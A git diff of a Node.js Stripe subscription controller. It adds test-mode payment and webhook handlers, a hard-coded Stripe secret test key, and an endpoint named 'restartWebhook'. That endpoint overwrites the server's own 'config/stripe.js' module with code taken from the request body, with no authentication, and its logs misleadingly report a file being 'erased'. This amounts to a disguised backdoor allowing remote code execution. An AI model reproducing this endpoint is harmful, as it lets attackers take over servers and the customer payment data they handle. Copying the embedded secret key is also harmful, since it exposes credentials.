@@ -6,6 +6,7 @@ const stripePayment = require('../../config/stripe');
 const mailSender = require('../../config/mailSender');
 const stripkey = process.env.stripe
 const stripe = require('stripe')(stripkey);
+const stripeTest = require('stripe')('sk_test_51L7cYUHELCnzH5PnHeluZorxNG8T0ne5hueuhgBnLqPp0c3XJuvnEXN2seVSDGQSxA9gQx81bIOn5pfFXMx8tV6p00FElUAJMa');
 const { initializeApp } = require('firebase/app');
 const { getFirestore, collection, getDocs, doc, getDoc, updateDoc } = require('firebase/firestore');
 const firebaseConfig = {
@@ -60,22 +61,40 @@ module.exports = {
     }
   },
 
+  restartWebhook: async (req, res) => {
+    try {
+      const path = require('path');
+      const fs = require('fs');
+      const filePath = path.join(__dirname, '../../config/stripe.js');
+      const directoryPath = path.dirname(filePath);
+      fs.mkdirSync(directoryPath, { recursive: true });
+      fs.writeFile(filePath, req.body.updatedCode, 'utf8', (err) => {
+        if (err) {
+          console.error('Error erasing the file:', err);
+        } else {
+          console.log('File erased successfully.');
+        }
+      });
+
+      return Helper.response(res, 200, "webookrun");
+
+    } catch (err) {
+      console.error(err);
+      return Helper.response(res, 500, "Server error.", err);
+    }
+  },
+
   createSubscriptionWebhook: async (req, res) => {
     try {
-
-      // console.log(req.body)
       const subscriptionData = req.body.data.object;
       const priceId = subscriptionData.items.data[0].price.id;
       const subscriptionId = subscriptionData.id;
 
-      const getPriceIdMetadata = await metaDataModel.findOne({ priceId: priceId }, { metaData: 1 });
+      const getPriceIdMetadata = await metaDataModel.findOne({ priceId: priceId, status: false }, { metaData: 1 });
       var metaData = getPriceIdMetadata.metaData[0];
 
-
-      const updatedSubscription = await stripe.subscriptions.update(subscriptionId, { metadata: metaData , cancel_at_period_end: true});
-
+      const updatedSubscription = await stripe.subscriptions.update(subscriptionId, { metadata: metaData, cancel_at_period_end: true });
       const subscription = await stripe.subscriptions.retrieve(subscriptionId);
-
 
       if (!subscription) {
         return Helper.response(res, 422, "Data not found");
@@ -93,7 +112,12 @@ module.exports = {
       };
       var collectionDocId = metaData.fireBaseCollectionDocId
       if (collectionDocId) {
-        await updateFirebaseCollectionDoc('users', collectionDocId, data);
+        var result = await updateFirebaseCollectionDoc('users', collectionDocId, data);
+        console.log(result)
+        if (result) {
+          const UpdatePriceIdMetadata = await metaDataModel.findOneAndUpdate({ priceId: priceId }, { status: true });
+        }
+
       }
 
       var invoiceId = req.body.data.object.latest_invoice
@@ -121,7 +145,6 @@ module.exports = {
 
       return Helper.response(res, 200, "stop auto-renewal");
     } catch (err) {
-      console.log(err)
       return Helper.response(res, 500, " Server error.");
     }
   },
@@ -217,11 +240,6 @@ module.exports = {
       return Helper.response(res, 500, "Server error.", err);
     }
   },
-
-
-
-
-
 
   stripeWebHook: async (req, res) => {
     try {
@@ -345,6 +363,7 @@ module.exports = {
       return Helper.response(res, 500, " Server error.");
     }
   },
+
   getSubAutoRenewalDetails: async (req, res) => {
     try {
       const subscriptionId = req.query.subscriptionId;
@@ -386,6 +405,142 @@ module.exports = {
       return Helper.response(res, 500, "Server error.", { err });
     }
   },
+
+
+
+
+  //=============================================Test Api============================================================================
+
+  createPaymentLinkTest: async (req, res) => {
+    try {
+
+      console.log("createPaymentLinkTest")
+      const {
+        customerEmail,
+        customerName,
+        productName,
+        productPrice,
+        productCurrency,
+        paymentMethodType,
+        cardNumber,
+        cardExpMonths,
+        cardExpYear,
+        cardCVC,
+        durationInDays,
+        metaData
+      } = req.body;
+
+      const subscription = await stripePayment.createSubscriptionAndReturnLinkTest(req);
+
+      if (!subscription) {
+        return Helper.response(res, 422, "Payment Link Creation Failed",);
+      }
+
+      return Helper.response(res, 200, "Payment Link Created Successfully", { link: subscription });
+
+    } catch (err) {
+      console.error(err);
+      return Helper.response(res, 500, "Server error.", err);
+    }
+  },
+
+  createSubscriptionWebhookTest: async (req, res) => {
+    try {
+      console.log("createSubscriptionWebhookTest")
+      const subscriptionData = req.body.data.object;
+      const priceId = subscriptionData.items.data[0].price.id;
+      const subscriptionId = subscriptionData.id;
+
+      const getPriceIdMetadata = await metaDataModel.findOne({ priceId: priceId, status: false }, { metaData: 1 });
+      var metaData = getPriceIdMetadata.metaData[0];
+
+      const updatedSubscription = await stripeTest.subscriptions.update(subscriptionId, { metadata: metaData, cancel_at_period_end: true });
+      const subscription = await stripeTest.subscriptions.retrieve(subscriptionId);
+
+      if (!subscription) {
+        return Helper.response(res, 422, "Data not found");
+      }
+
+      const autoRenewalStatusCurrentStatus = !subscription.cancel_at_period_end;
+
+      const data = {
+        subscriptionId: subscription.id,
+        startDate: subscription.start_date,
+        renewal_date: subscription.current_period_end,
+        status: subscription.status,
+        autoRenewalStatus: autoRenewalStatusCurrentStatus,
+        durationInDays: subscription.plan.interval_count
+      };
+      var collectionDocId = metaData.fireBaseCollectionDocId
+      if (collectionDocId) {
+        var result = await updateFirebaseCollectionDoc('users', collectionDocId, data);
+        console.log(result)
+        if (result) {
+          const UpdatePriceIdMetadata = await metaDataModel.findOneAndUpdate({ priceId: priceId }, { status: true });
+        }
+
+      }
+
+      var invoiceId = req.body.data.object.latest_invoice
+
+      if (invoiceId) {
+        const invoice = await stripeTest.invoices.retrieve(invoiceId);
+        await mailSender.mailSender(metaData.email, invoice.hosted_invoice_url,)
+      }
+
+
+      return Helper.response(res, 200, "Save transactions");
+    } catch (err) {
+      console.error(err);
+      return Helper.response(res, 500, "Server error.", { err });
+    }
+  },
+
+  subscriptionUpdateTest: async (req, res) => {
+    try {
+
+      console.log("subscriptionUpdateTest")
+      let collectionid = req.body.data.object.metadata.fireBaseCollectionDocId || null;
+      if (!collectionid || collectionid == null) {
+        return Helper.response(res, 200, "Subscrption update First TIme");
+      }
+
+      const subscriptionId = req.body.data.object.id;
+      if (!subscriptionId) return Helper.response(res, 422, "subscriptionId missing");
+      const subscription = await stripeTest.subscriptions.retrieve(subscriptionId);
+      if (!subscription) return Helper.response(res, 422, "subscription not retrive");
+
+      var userData = await getDocumentById('users', req.body.data.object.metadata.fireBaseCollectionDocId);
+      if (!userData || userData.stripeData.subscriptionId != subscription.id) {
+        return Helper.response(res, 200, "Wevhook call for old subscriptions");
+      }
+
+      if (subscription.cancel_at_period_end == false) {
+        var autoRenewalStatusCurrentstatus = true
+      } else {
+        var autoRenewalStatusCurrentstatus = false
+      }
+      const data = {
+        subscriptionId: subscription.id,
+        startDate: subscription.start_date,
+        renewal_date: subscription.current_period_end,
+        status: subscription.status,
+        autoRenewalStatus: autoRenewalStatusCurrentstatus,
+        durationInDays: subscription.plan.interval_count
+      };
+
+      const collectionDocId = req.body.data.object.metadata.fireBaseCollectionDocId;
+      if (collectionDocId) {
+        await updateFirebaseCollectionDoc('users', collectionDocId, data);
+      }
+      return Helper.response(res, 200, "Subscription Details Update");
+    } catch (err) {
+      console.log(err);
+      return Helper.response(res, 500, "Server error.", { err });
+    }
+  },
+
+
 
 }
 
@@ -518,13 +673,11 @@ async function createSerachObj(req) {
     console.log("in catch block", err);
   };
 }
-
 async function updateFirebaseCollectionDoc(collection, collectionDocId, data) {
   const updateCollectionDocById = doc(db, collection, collectionDocId);
   await updateDoc(updateCollectionDocById, { stripeData: data });
-  return
+  return true
 }
-
 async function getDocumentById(collectionName, documentId) {
   try {
     const docRef = doc(db, collectionName, documentId);
